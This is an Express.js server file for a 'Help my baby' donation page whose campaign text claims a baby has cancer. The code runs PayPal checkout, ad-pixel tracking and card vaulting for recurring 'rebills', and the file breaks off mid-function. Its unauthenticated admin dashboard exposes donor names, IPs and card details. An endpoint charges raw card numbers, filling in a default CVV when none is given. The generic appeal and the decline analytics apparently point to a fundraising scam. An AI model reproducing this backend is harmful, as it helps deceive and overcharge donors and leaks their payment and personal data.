require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const cookieParser = require('cookie-parser');

const {
  trackEvent,
  trackDonate,
  trackSubscribe,
  getTrackingConfig,
  isTrackingEnabled,
  getRecentCapiEvents,
} = require('./lib/tracking');
const { createJourneyLog } = require('./lib/logger');
const {
  visitors,
  getOrCreateVisitor,
  getClientInfo,
} = require('./lib/visitors');
const {
  rememberAttempt,
  attemptContext,
  describeNetworkCode,
  failureLine,
  recordOutcome,
  getAuthStats,
} = require('./lib/payment-forensics');

const app = express();
const PORT = process.env.PORT || 3000;
const STORE_PATH = process.env.STORE_PATH || path.join(__dirname, 'transactions.json');

const MARKET_CODE = 'US';
const ACTIVE_CAMPAIGN = 'help-my-baby';

function fmtCurrency(amount) {
  const num = Number(amount);
  if (!Number.isFinite(num)) return `$${amount}`;
  return num % 1 === 0 ? `$${num}` : `$${num.toFixed(2)}`;
}

const JourneyLog = createJourneyLog(fmtCurrency, { market: MARKET_CODE });

function generateFBP() {
  const timestamp = Date.now();
  const high = Math.floor(Math.random() * 1e10);
  const low = Math.floor(Math.random() * 1e9);
  const random = `${high}${low.toString().padStart(9, '0')}`;
  return `fb.1.${timestamp}.${random}`;
}

function buildPixelScripts() {
  const trackingConfig = getTrackingConfig();
  let pixelScripts = '';

  if (trackingConfig.enabled) {
    if (trackingConfig.fbPixelId) {
      pixelScripts += `
  <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '${trackingConfig.fbPixelId}');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=${trackingConfig.fbPixelId}&ev=PageView&noscript=1"/></noscript>`;
    }

    if (trackingConfig.tiktokPixelId) {
      pixelScripts += `
  <script>
    !function (w, d, t) {
      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
      ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];
      ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
      for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
      ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
      ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";
      ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};
      var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;
      var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
      ttq.load('${trackingConfig.tiktokPixelId}');
    }(window, document, 'ttq');
  </script>`;
    }
  }
  return pixelScripts;
}

function loadStore() {
  try {
    if (fs.existsSync(STORE_PATH)) {
      const parsed = JSON.parse(fs.readFileSync(STORE_PATH, 'utf8'));
      return {
        schedules: Array.isArray(parsed.schedules) ? parsed.schedules : [],
        transactions: Array.isArray(parsed.transactions)
          ? parsed.transactions
          : [],
      };
    }
  } catch (err) {
    console.error('Failed to read transactions.json:', err.message);
  }
  return { schedules: [], transactions: [] };
}

function saveStore(store) {
  try {
    fs.writeFileSync(STORE_PATH, JSON.stringify(store, null, 2), 'utf8');
  } catch (err) {
    console.error('Failed to write transactions.json:', err.message);
  }
}

const PAYPAL_MODE = (process.env.PAYPAL_MODE || 'sandbox').toLowerCase();
const PAYPAL_CLIENT_ID = (process.env.PAYPAL_CLIENT_ID || '').trim();
const PAYPAL_CLIENT_SECRET = (process.env.PAYPAL_CLIENT_SECRET || '').trim();
const PAYPAL_API_BASE =
  PAYPAL_MODE === 'live'
    ? 'https://api-m.paypal.com'
    : 'https://api-m.sandbox.paypal.com';

app.use(express.json());
app.use(cookieParser());

// First-party _fbp cookie generation
app.use((req, res, next) => {
  if (!req.cookies._fbp) {
    const fbp = generateFBP();
    const isProd = process.env.NODE_ENV === 'production';
    res.cookie('_fbp', fbp, {
      maxAge: 7 * 24 * 60 * 60 * 1000,
      httpOnly: false,
      secure: isProd,
      sameSite: isProd ? 'None' : 'Lax',
      path: '/',
    });
    req.cookies._fbp = fbp;
  }
  next();
});

// API failures, slow calls, and 404 scanner counter
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const status = res.statusCode;
    const reqPath = req.originalUrl.split('?')[0];
    if (status === 404 && !reqPath.startsWith('/api/')) {
      JourneyLog.scannerHit();
      return;
    }
    if (!reqPath.startsWith('/api/')) return;
    const ms = Date.now() - start;
    if (status >= 500 || (status >= 400 && status !== 404)) {
      JourneyLog.system(
        status >= 500 ? '💥' : '⚠️',
        `HTTP ${status} ${req.method} ${reqPath} (${ms}ms)`
      );
    } else if (ms > 3000) {
      JourneyLog.system('🐢', `slow ${req.method} ${reqPath} took ${ms}ms`);
    }
  });
  next();
});

// Serve index.html dynamically with injected Meta & TikTok Pixel scripts
app.get(['/', '/index.html'], (_req, res) => {
  const templatePath = path.join(__dirname, 'public', 'index.html');
  let html = fs.readFileSync(templatePath, 'utf8');
  html = html.replace('<!-- TRACKING_PIXELS_PLACEHOLDER -->', buildPixelScripts());
  res.send(html);
});

// Serve dedicated Subscriptions, Rebills & Analytics Dashboard
app.get(['/dashboard', '/admin'], (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.use(express.static(path.join(__dirname, 'public'), { index: false }));

// Cache OAuth token in memory until near expiry
let cachedToken = null;
let tokenExpiresAt = 0;

async function getAccessToken() {
  const now = Date.now();
  if (cachedToken && now < tokenExpiresAt - 30_000) {
    return cachedToken;
  }

  const credentials = Buffer.from(
    `${PAYPAL_CLIENT_ID}:${PAYPAL_CLIENT_SECRET}`
  ).toString('base64');

  const response = await fetch(`${PAYPAL_API_BASE}/v1/oauth2/token`, {
    method: 'POST',
    headers: {
      Authorization: `Basic ${credentials}`,
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'grant_type=client_credentials',
  });

  if (!response.ok) {
    const errText = await response.text();
    throw new Error(`PayPal OAuth failed (${response.status}): ${errText}`);
  }

  const data = await response.json();
  cachedToken = data.access_token;
  tokenExpiresAt = now + (data.expires_in || 3200) * 1000;
  return cachedToken;
}

/**
 * Exact PayPal Donate gross-up fee formula:
 * fee = amount > 0 ? (amount + flatFee) / (1 - feeRate / 100) - amount : 0
 */
const FLAT_FEE = 0.30;
const FEE_RATE_PERCENT = 5.40;

function computeFinalAmount(rawAmount, coverFees) {
  const base = Number.parseFloat(rawAmount);
  if (!Number.isFinite(base) || base < 1 || base > 100000) {
    throw new Error('Please enter a valid donation amount of at least $1.00 USD.');
  }
  if (!coverFees) {
    return base.toFixed(2);
  }
  const rate = FEE_RATE_PERCENT * 0.01;
  const fee = Number(((base + FLAT_FEE) / (1 - rate) - base).toFixed(2));
  return (base + fee).toFixed(2);
}

// Public config endpoint for the frontend SDK loader
app.get('/api/config', (req, res) => {
  const clientInfo = getClientInfo(req);
  const { visitor } = getOrCreateVisitor(
    clientInfo.ipAddress,
    clientInfo.clientLocation,
    clientInfo.userAgent
  );
  res.json({
    clientId: PAYPAL_CLIENT_ID,
    mode: PAYPAL_MODE,
    currency: 'USD',
    feeRatePercent: FEE_RATE_PERCENT,
    flatFee: FLAT_FEE,
    visitorId: visitor.id,
    ipAddress: clientInfo.ipAddress,
    device: clientInfo.device,
    location: clientInfo.clientLocation,
    tracking: getTrackingConfig(),
    campaign: {
      title: 'Help my baby',
      description:
        'My baby has cancer and am raising funds for the life saving surgery. Any donation counts',
    },
  });
});

// Tracking config endpoint
app.get('/api/tracking/config', (req, res) => {
  const config = getTrackingConfig();
  const fbp = req.cookies._fbp || null;
  const clientInfo = getClientInfo(req);
  const { visitor } = getOrCreateVisitor(
    clientInfo.ipAddress,
    clientInfo.clientLocation,
    clientInfo.userAgent
  );
  res.json({
    ...config,
    fbp,
    visitorId: visitor.id,
    ipAddress: clientInfo.ipAddress,
    device: clientInfo.device,
    location: clientInfo.clientLocation,
  });
});

// Browser -> Server CAPI & Journey Log endpoint
app.post('/api/track', async (req, res) => {
  const { event, eventId, sourceUrl, cookies, clientLocation, data } =
    req.body || {};
  const clientInfo = getClientInfo(req);
  if (clientLocation?.countryCode) {
    clientInfo.clientLocation = clientLocation;
  }

  const { visitor } = getOrCreateVisitor(
    clientInfo.ipAddress,
    clientInfo.clientLocation,
    clientInfo.userAgent
  );

  const userData = {
    email: data?.email || null,
    emailHash: data?.emailHash || null,
    fbp: cookies?.fbp || req.cookies._fbp || null,
    fbc: cookies?.fbc || req.cookies._fbc || null,
    ttp: cookies?.ttp || req.cookies._ttp || null,
    ttclid: cookies?.ttclid || req.cookies._ttclid || null,
    externalId: visitor.id,
  };

  const resolvedSourceUrl =
    sourceUrl || `${req.protocol}://${req.get('host')}/`;

  const eventData = {
    eventId,
    sourceUrl: resolvedSourceUrl,
    value: data?.value,
    currency: data?.currency || 'USD',
    contentName: data?.contentName,
    contentType: data?.contentType,
  };

  try {
    let capiStatus = { meta: '-', tiktok: '-' };
    if (isTrackingEnabled()) {
      capiStatus = await trackEvent(event, eventData, userData, clientInfo);
    }

    if (event === 'PageView') {
      return res.json({ success: true, visitorId: visitor.id, capiStatus });
    }

    if (event === 'ViewContent') {
      JourneyLog.newVisitor(visitor, resolvedSourceUrl, capiStatus);
    } else {
      const eventMessages = {
        Lead: 'Signed support message',
        AddToCart: 'opened card donation drawer',
        InitiateCheckout: `started checkout (${fmtCurrency(
          data?.value || '?'
        )})`,
        AddPaymentInfo: 'typing card details in hosted fields',
        Donate: 'completed donation',
        Purchase: 'completed donation',
      };
      JourneyLog.event(
        visitor,
        event,
        eventMessages[event] || event,
        capiStatus
      );
    }

    return res.json({ success: true, visitorId: visitor.id, capiStatus });
  } catch (error) {
    return res.json({ success: false, error: error.message });
  }
});

// Payment interaction telemetry
app.post('/api/track/payment-event', (req, res) => {
  const clientInfo = getClientInfo(req);
  const { eventType, details, amount, paymentMethod, clientLocation } =
    req.body || {};

  const { visitor } = getOrCreateVisitor(
    clientInfo.ipAddress,
    clientLocation || clientInfo.clientLocation,
    clientInfo.userAgent
  );

  let detailStr = details || '';
  if (amount) {
    detailStr = `${fmtCurrency(amount)}${
      paymentMethod ? ` via ${paymentMethod}` : ''
    }${details ? ` · ${details}` : ''}`;
  }

  JourneyLog.paymentEvent(visitor, eventType, detailStr);
  res.json({ success: true });
});

// Client browser error monitor endpoint
app.post(
  '/api/client/error',
  express.text({ type: '*/*', limit: '4kb' }),
  (req, res) => {
    let body = req.body;
    if (typeof body === 'string') {
      try {
        body = JSON.parse(body);
      } catch (_) {
        body = {};
      }
    }
    const kind = String(body?.kind || 'js')
      .replace(/[^\w]/g, '')
      .slice(0, 20);
    const msg = String(body?.msg || '')
      .replace(/\s+/g, ' ')
      .slice(0, 200);
    if (!msg) return res.status(204).end();
    const clientInfo = getClientInfo(req);
    const { visitor } = getOrCreateVisitor(
      clientInfo.ipAddress,
      clientInfo.clientLocation,
      clientInfo.userAgent
    );
    const src = String(body.src || '')
      .replace(/^https?:\/\/[^/]+/, '')
      .replace(/\?.*$/, '')
      .slice(0, 80);
    const sig = `${kind}|${msg.replace(/\d+/g, '#')}|${src}`;
    JourneyLog.clientError(
      visitor.id,
      sig,
      `${kind}: ${msg}${
        body.code ? ' [' + String(body.code).slice(0, 40) + ']' : ''
      }${
        src ? ' · ' + src + (body.line ? ':' + Number(body.line) : '') : ''
      } · ${clientInfo.device}`
    );
    return res.status(204).end();
  }
);

// Checkout funnel exit & attempt timing endpoint
app.post('/api/client/report', (req, res) => {
  const body = req.body || {};
  const clientInfo = getClientInfo(req);
  if (body.t === 'exit' && body.stage) {
    JourneyLog.checkoutExit(String(body.stage));
  } else if (body.t === 'attempt') {
    JourneyLog.attempt(
      clientInfo.device,
      String(body.result || 'error'),
      Number(body.ms || 0)
    );
  }
  res.status(204).end();
});

// Health / credential verification endpoint
app.get('/api/health', async (_req, res) => {
  try {
    await getAccessToken();
    res.json({ ok: true, mode: PAYPAL_MODE, paypalAuthenticated: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// Create an Order (PayPal Orders v2) — supports One-Time + Weekly/Monthly Vaulting (store_in_vault: ON_SUCCESS)
app.post('/api/orders', async (req, res) => {
  const clientInfo = getClientInfo(req);
  const { visitor } = getOrCreateVisitor(
    clientInfo.ipAddress,
    clientInfo.clientLocation,
    clientInfo.userAgent
  );

  try {
    const {
      amount,
      coverFees,
      frequency = 'ONE_TIME',
      fundingSource = 'card',
    } = req.body || {};
    const finalValue = computeFinalAmount(amount, Boolean(coverFees));
    const accessToken = await getAccessToken();

    const isRecurring = frequency === 'WEEK' || frequency === 'MONTH';
    const freqLabel =
      frequency === 'WEEK'
        ? 'Weekly'
        : frequency === 'MONTH'
        ? 'Monthly'
        : 'One-Time';
    const itemDescription = isRecurring
      ? `${freqLabel} Recurring Donation to Help my baby`
      : 'Donation to Help my baby';

    const orderPayload = {
      intent: 'CAPTURE',
      purchase_units: [
        {
          description: itemDescription,
          custom_id: `DONATION_HELP_MY_BABY_${frequency}`,
          amount: {
            currency_code: 'USD',
            value: finalValue,
          },
        },
      ],
      application_context: {
        brand_name: 'Help my baby',
        shipping_preference: 'NO_SHIPPING',
        user_action: 'PAY_NOW',
      },
    };

    if (isRecurring && fundingSource === 'card') {
      orderPayload.payment_source = {
        card: {
          attributes: {
            vault: {
              store_in_vault: 'ON_SUCCESS',
            },
          },
        },
      };
    }

    const response = await fetch(`${PAYPAL_API_BASE}/v2/checkout/orders`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(orderPayload),
    });

    const data = await response.json();
    if (!response.ok) {
      const errMsg =
        data?.details?.[0]?.description ||
        data?.message ||
        'Failed to create PayPal order.';
      JourneyLog.decline(
        visitor,
        `order creation failed: ${errMsg}`,
        `${visitor.country}:ORDER_FAIL`
      );
      return res.status(response.status).json({
        error: errMsg,
        details: data,
      });
    }

    rememberAttempt(data.id, {
      vid: visitor.id,
      mkt: MARKET_CODE,
      ua: clientInfo.userAgent,
      ip: clientInfo.ipAddress,
      geo: visitor.country,
      currency: 'USD',
      amount: finalValue,
      frequency,
    });

    const baseNum = Number.parseFloat(amount) || Number.parseFloat(finalValue);
    const feeNum = Math.max(
      0,
      Number((Number.parseFloat(finalValue) - baseNum).toFixed(2))
    );
    JourneyLog.paymentEvent(
      visitor,
      'redirect_initiated',
      `${fmtCurrency(baseNum)}${
        feeNum > 0 ? ' + ' + fmtCurrency(feeNum) + ' fee' : ''
      } (${freqLabel}) → PayPal Order ${data.id}`
    );

    return res.json({
      id: data.id,
      amount: finalValue,
      frequency,
      visitorId: visitor.id,
    });
  } catch (err) {
    JourneyLog.paymentEvent(visitor, 'card_error', err.message);
    return res.status(400).json({ error: err.message });
  }
});

// Capture an approved Order, fire Meta CAPI Donate (+ Subscribe), and persist in transactions.json
app.post('/api/orders/:orderID/capture', async (req, res) => {
  const clientInfo = getClientInfo(req);
  const { visitor } = getOrCreateVisitor(
    clientInfo.ipAddress,
    clientInfo.clientLocation,
    clientInfo.userAgent
  );

  try {
    const { orderID } = req.params;
    const {
      frequency = 'ONE_TIME',
      amount,
      baseAmount,
      coverFees = false,
      donorName,
      donorEmail,
      tracking = {},
    } = req.body || {};
    const accessToken = await getAccessToken();

    const response = await fetch(
      `${PAYPAL_API_BASE}/v2/checkout/orders/${encodeURIComponent(
        orderID
      )}/capture`,
      {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${accessToken}`,
          'Content-Type': 'application/json',
        },
      }
    );

    const data = await response.json();
    const captureObj = data?.purchase_units?.[0]?.payments?.captures?.[0] || {};
    const cardObj = data?.payment_source?.card || {};
    const procCode = captureObj?.processor_response?.response_code || null;

    if (!response.ok || captureObj?.status === 'DECLINED') {
      const issue =
        data?.details?.[0]?.issue ||
        (captureObj?.status === 'DECLINED' ? 'CAPTURE_DECLINED' : 'CAPTURE_ERR');
      const errDesc =
        data?.details?.[0]?.description ||
        data?.message ||
        describeNetworkCode(cardObj.brand, procCode) ||
        'Card declined by issuer.';
      const fLine = failureLine(
        orderID,
        {
          brand: cardObj.brand || 'CARD',
          cardType: cardObj.type || '',
          last4: cardObj.last_digits || '',
          code: procCode || issue,
          issue: errDesc,
        },
        attemptContext(orderID)
      );
      JourneyLog.decline(
        visitor,
        `${fLine} [${orderID}]`,
        `${visitor.country}:${procCode || issue}`
      );
      recordOutcome(false, {
        country: visitor.country,
        code: procCode || issue,
      });
      return res.status(response.status >= 400 ? response.status : 422).json({
        error: errDesc,
        processorResponseCode: procCode,
        details: data,
      });
    }

    recordOutcome(true, { country: visitor.country, code: procCode || '0000' });

    const vaultInfo = cardObj?.attributes?.vault || null;
    const netRef = captureObj?.network_transaction_reference || {};
    const nowIso = new Date().toISOString();
    const capturedAmount =
      captureObj?.amount?.value ||
      (amount ? Number(amount).toFixed(2) : '0.00');
    const totalNum = Number.parseFloat(capturedAmount) || 0;
    const baseNum = Number.parseFloat(baseAmount || amount) || totalNum;
    const tipNum = Math.max(0, Number((totalNum - baseNum).toFixed(2)));

    const payerName = data?.payer?.name?.given_name
      ? `${data.payer.name.given_name} ${data.payer.name.surname || ''}`.trim()
      : '';
    const resolvedDonorName =
      [cardObj.name, donorName, payerName]
        .map((n) => String(n || '').trim())
        .find((n) => n && !/^(=|-|—|unknown|null|undefined)$/i.test(n)) ||
      'Generous Supporter';
    const resolvedEmail =
      donorEmail || data?.payer?.email_address || null;

    const store = loadStore();
    let scheduleId = null;

    if ((frequency === 'WEEK' || frequency === 'MONTH') && vaultInfo?.id) {
      scheduleId = `SCHED-${Date.now()}`;
      const newSchedule = {
        scheduleId,
        status: 'ACTIVE',
        vaultId: vaultInfo.id,
        vaultStatus: vaultInfo.status || 'VAULTED',
        customerId: vaultInfo?.customer?.id || visitor.id,
        donorName: resolvedDonorName,
        donorEmail: resolvedEmail,
        visitorId: visitor.id,
        ipAddress: clientInfo.ipAddress,
        location: JourneyLog.formatLocation(visitor) || 'Local (DEV)',
        device: clientInfo.device,
        frequency,
        amount: capturedAmount,
        currency: 'USD',
        cardBrand: cardObj.brand || 'VISA',
        cardLast4: cardObj.last_digits || '1111',
        cardExpiry: cardObj.expiry || '',
        initialOrderId: data.id,
        initialCaptureId: captureObj.id || null,
        lastNetworkReferenceId: netRef.id || null,
        networkName: netRef.network || cardObj.brand || 'VISA',
        createdAt: nowIso,
        lastBilledAt: nowIso,
        rebillCount: 0,
      };
      store.schedules.unshift(newSchedule);
    }

    // Fire server-side Meta Conversions API Donate (+ Subscribe for recurring) with shared eventId
    const donateEventId =
      tracking.eventId || `Donate_${captureObj.id || data.id}`;
    const sourceUrl =
      tracking.sourceUrl || `${req.protocol}://${req.get('host')}/`;
    const trackingPayload = {
      eventId: donateEventId,
      sourceUrl,
      fbp: tracking.fbp || req.cookies._fbp || null,
      fbc: tracking.fbc || req.cookies._fbc || null,
      ttp: tracking.ttp || req.cookies._ttp || null,
      ttclid: tracking.ttclid || req.cookies._ttclid || null,
    };

    let capiResult = { meta: '-', tiktok: '-' };
    if (isTrackingEnabled()) {
      try {
        capiResult = await trackDonate(
          {
            amount: totalNum,
            currency: 'USD',
            donationType:
              frequency === 'MONTH'
                ? 'monthly'
                : frequency === 'WEEK'
                ? 'weekly'
                : 'one-time',
            captureId: captureObj.id || data.id,
            cardHolderName: resolvedDonorName,
            donorNameReal: resolvedDonorName,
            donorEmail: resolvedEmail,
            customerId: vaultInfo?.customer?.id || visitor.id,
          },
          trackingPayload,
          clientInfo
        );

        if (frequency === 'WEEK' || frequency === 'MONTH') {
          await trackSubscribe(
            {
              id: scheduleId || vaultInfo?.id || data.id,
              monthly: totalNum,
              amount: totalNum,
              currency: 'USD',
              frequency,
            },
            { name: resolvedDonorName, email: resolvedEmail },
            trackingPayload,
            clientInfo
          );
        }
      } catch (capiErr) {
        console.error('CAPI tracking error (non-critical):', capiErr.message);
      }
    }

    JourneyLog.purchase(
      visitor,
      {
        amount: baseNum,
        tip: tipNum,
        total: totalNum,
        brand:
          cardObj.brand || (data?.payment_source?.paypal ? 'PayPal' : 'Card'),
        last4: cardObj.last_digits || null,
        name: resolvedDonorName,
        frequency,
        vaultId: vaultInfo?.id || null,
      },
      capiResult
    );

    const txRecord = {
      txId: `TX-${Date.now()}`,
      type: 'INITIAL',
      scheduleId,
      orderId: data.id,
      captureId: captureObj.id || data.id,
      status: captureObj.status || data.status || 'COMPLETED',
      frequency,
      amount: capturedAmount,
      baseAmount: baseNum.toFixed(2),
      feeCovered: coverFees ? tipNum.toFixed(2) : '0.00',
      paypalFee:
        captureObj?.seller_receivable_breakdown?.paypal_fee?.value || null,
      netAmount:
        captureObj?.seller_receivable_breakdown?.net_amount?.value || null,
      currency: 'USD',
      donorName: resolvedDonorName,
      cardBrand:
        cardObj.brand || (data?.payment_source?.paypal ? 'PAYPAL' : 'VISA'),
      cardLast4: cardObj.last_digits || null,
      cardExpiry: cardObj.expiry || null,
      vaultId: vaultInfo?.id || null,
      vaultStatus:
        vaultInfo?.status || (frequency === 'ONE_TIME' ? 'ONE_TIME' : null),
      customerId: vaultInfo?.customer?.id || visitor.id,
      networkReferenceId: netRef.id || null,
      networkName: netRef.network || cardObj.brand || null,
      processorResponseCode: procCode || '0000',
      visitorId: visitor.id,
      ipAddress: clientInfo.ipAddress,
      location: JourneyLog.formatLocation(visitor) || 'Local (DEV)',
      device: clientInfo.device,
      donateEventId,
      capiMeta: capiResult.meta,
      capiTiktok: capiResult.tiktok,
      createdAt: captureObj.create_time || nowIso,
    };

    store.transactions.unshift(txRecord);
    saveStore(store);

    return res.json({
      ...data,
      _recordedTransaction: txRecord,
      _tracking: {
        donateEventId,
        capiStatus: capiResult,
        visitorId: visitor.id,
      },
    });
  } catch (err) {
    JourneyLog.paymentEvent(visitor, 'card_error', err.message);
    return res.status(400).json({ error: err.message });
  }
});

function buildDashboardData() {
  const store = loadStore();
  const schedules = store.schedules.map((s) => ({
    status: s.status || 'ACTIVE',
    ...s,
  }));
  const transactions = store.transactions || [];

  let totalDonated = 0;
  let initialDonationsTotal = 0;
  let rebillsTotal = 0;
  let totalRebills = 0;
  let netTotal = 0;

  transactions.forEach((t) => {
    if (t.status === 'COMPLETED' || !t.status) {
      const amt = Number.parseFloat(t.amount) || 0;
      const net = Number.parseFloat(t.netAmount) || amt;
      totalDonated += amt;
      netTotal += net;
      if (t.type === 'REBILL') {
        rebillsTotal += amt;
        totalRebills += 1;
      } else {
        initialDonationsTotal += amt;
      }
    }
  });

  let activeSubscriptions = 0;
  let pausedSubscriptions = 0;
  let cancelledSubscriptions = 0;
  let weeklyRecurringVolume = 0;
  let monthlyRecurringVolume = 0;

  schedules.forEach((s) => {
    const st = (s.status || 'ACTIVE').toUpperCase();
    const amt = Number.parseFloat(s.amount) || 0;
    if (st === 'PAUSED') {
      pausedSubscriptions += 1;
    } else if (st === 'CANCELLED') {
      cancelledSubscriptions += 1;
    } else {
      activeSubscriptions += 1;
      if (s.frequency === 'WEEK') {
        weeklyRecurringVolume += amt;
      } else {
        monthlyRecurringVolume += amt;
      }
    }
  });

  const estimatedMonthlyRunRate =
    monthlyRecurringVolume + weeklyRecurringVolume * 4.33;

  return {
    paypalMode: PAYPAL_MODE,
    stats: {
      totalDonated: Number(totalDonated.toFixed(2)),
      netTotal: Number(netTotal.toFixed(2)),
      initialDonationsTotal: Number(initialDonationsTotal.toFixed(2)),
      rebillsTotal: Number(rebillsTotal.toFixed(2)),
      totalTransactions: transactions.length,
      totalRebills,
      activeSubscriptions,
      pausedSubscriptions,
      cancelledSubscriptions,
      weeklyRecurringVolume: Number(weeklyRecurringVolume.toFixed(2)),
      monthlyRecurringVolume: Number(monthlyRecurringVolume.toFixed(2)),
      estimatedMonthlyRunRate: Number(estimatedMonthlyRunRate.toFixed(2)),
      uniqueVisitors: visitors.size,
    },
    schedules,
    transactions,
    serverLogs: JourneyLog.getRecentLogs(),
    capiEvents: getRecentCapiEvents(),
    counters: JourneyLog.getCounters(),
    authStats: getAuthStats(),
    visitors: Array.from(visitors.values()),
    trackingConfig: getTrackingConfig(),
  };
}

// Dashboard & Debug data endpoint
app.get(['/api/dashboard', '/api/debug/transactions'], (_req, res) => {
  res.json(buildDashboardData());
});

// Create a new Subscription (via existing Vault Token ID OR direct Card Vaulting via PayPal Orders v2)
app.post('/api/subscriptions', async (req, res) => {
  const clientInfo = getClientInfo(req);
  const { visitor } = getOrCreateVisitor(
    clientInfo.ipAddress,
    clientInfo.clientLocation,
    clientInfo.userAgent
  );

  try {
    const {
      mode = 'vault', // 'vault' | 'card'
      vaultId,
      donorName = 'Generous Supporter',
      donorEmail = null,
      frequency = 'MONTH',
      amount = '25.00',
      cardBrand = 'VISA',
      cardLast4 = '1111',
      cardExpiry = '2028-12',
      cardNumber,
      cardCvv,
      chargeImmediately = false,
      notes = '',
    } = req.body || {};

    const cleanFreq = frequency === 'WEEK' ? 'WEEK' : 'MONTH';
    const finalValue = computeFinalAmount(amount, false);
    const nowIso = new Date().toISOString();
    const store = loadStore();

    // Mode A: Direct Card Vaulting + Initial Capture via PayPal Orders v2 + Vault v3
    if (mode === 'card' || (cardNumber && !vaultId)) {
      const cleanCardNumber = String(cardNumber || '').replace(/\s+/g, '');
      const cleanExpiry = String(cardExpiry || '').trim();
      const cleanCvv = String(cardCvv || '123').trim();
      if (!cleanCardNumber || !cleanExpiry) {
        return res
          .status(400)
          .json({ error: 'Card number and expiry (YYYY-MM) are required.' });
      }

      const accessToken = await getAccessToken();
      const freqLabel = cleanFreq === 'WEEK' ? 'Weekly' : 'Monthly';

      // 1. Create Order with store_in_vault: ON_SUCCESS
      const createRes = await fetch(`${PAYPAL_API_BASE}/v2/checkout/orders`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${accessToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          intent: 'CAPTURE',
          purchase_units: [
            {
              description: `${freqLabel} Recurring Subscription - Help my baby`,
              custom_id: `SUB_CREATE_${cleanFreq}_${Date.now()}`,
              amount: { currency_code: 'USD', value: finalValue },
            },
          ],
          payment_source: {
            card: {
              attributes: {
                vault: { store_in_vault: 'ON_SUCCESS' },
              },
            },
          },
        }),
      });
      const orderData = await createRes.json();
      if (!createRes.ok) {
        throw new Error(
          orderData?.details?.[0]?.description ||
            orderData?.message ||
            'Failed to create PayPal order for subscription.'
        );
      }

      // 2. Confirm Payment Source with Card details
      const confirmRes = await fetch(
        `${PAYPAL_API_BASE}/v2/checkout/orders/${orderData.id}/confirm-payment-source`,
        {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${accessToken}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            payment_source: {
              card: {
                name: donorName,
                number: cleanCardNumber,
                expiry: cleanExpiry,
                security_code: cleanCvv,
                attributes: {
                  vault: { store_in_vault: 'ON_SUCCESS' },
                },
              },
            },
          }),
        }
      );
      const confirmData = await confirmRes.json();
      if (!confirmRes.ok) {
        throw new Error(
          confirmData?.details?.[0]?.description ||
            confirmData?.message ||
            'Card confirmation failed.'
        );
      }

      // 3. Capture Order to finalize initial charge and generate Vault v3 token
      const capRes = await fetch(
        `${PAYPAL_API_BASE}/v2/checkout/orders/${orderData.id}/capture`,
        {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${accessToken}`,
            'Content-Type': 'application/json',
          },
        }
      );
      const capData = await capRes.json();
      const captureObj =
        capData?.purchase_units?.[0]?.payments?.captures?.[0] || {};
      const cardObj = capData?.payment_source?.card || {};
      if (!capRes.ok || captureObj?.status === 'DECLINED') {
        throw new Error(
          capData?.details?.[0]?.description ||
            capData?.message ||
            'Initial subscription capture was declined.'
        );
      }

      const vaultInfo = cardObj?.attributes?.vault || {};
      const netRef = captureObj?.network_transaction_reference || {};
      const scheduleId = `SCHED-${Date.now()}`;

      const newSchedule = {
        scheduleId,
        status: 'ACTIVE',
        vaultId: vaultInfo.id || `vault_${orderData.id}`,
        vaultStatus: vaultInfo.status || 'VAULTED',
        customerId: vaultInfo?.customer?.id || `cust_${Date.now()}`,
        donorName: donorName.trim() || 'Generous Supporter',
        donorEmail: donorEmail ? donorEmail.trim() : null,
        visitorId: visitor.id,
        ipAddress: clientInfo.ipAddress,
        location: JourneyLog.formatLocation(visitor) || 'Dashboard Admin',
        device: clientInfo.device,
        frequency: cleanFreq,
        amount: finalValue,
        currency: 'USD',
        cardBrand: cardObj.brand || cardBrand || 'VISA',
        cardLast4: cardObj.last_digits || cleanCardNumber.slice(-4),
        cardExpiry: cardObj.expiry || cleanExpiry,
        initialOrderId: orderData.id,
        initialCaptureId: captureObj.id || null,
        lastNetworkReferenceId: netRef.id || null,
        networkName: netRef.network || cardObj.brand || 'VISA',
        notes,
        createdAt: nowIso,
        lastBilledAt: nowIso,
        rebillCount: 0,
      };

      const txRecord = {
        txId: `TX-${Date.now()}`,
        type: 'INITIAL',
        scheduleId,
        orderId: orderData.id,
        captureId: captureObj.id || orderData.id,
        status: captureObj.status || 'COMPLETED',
        frequency: cleanFreq,
        amount: finalValue,
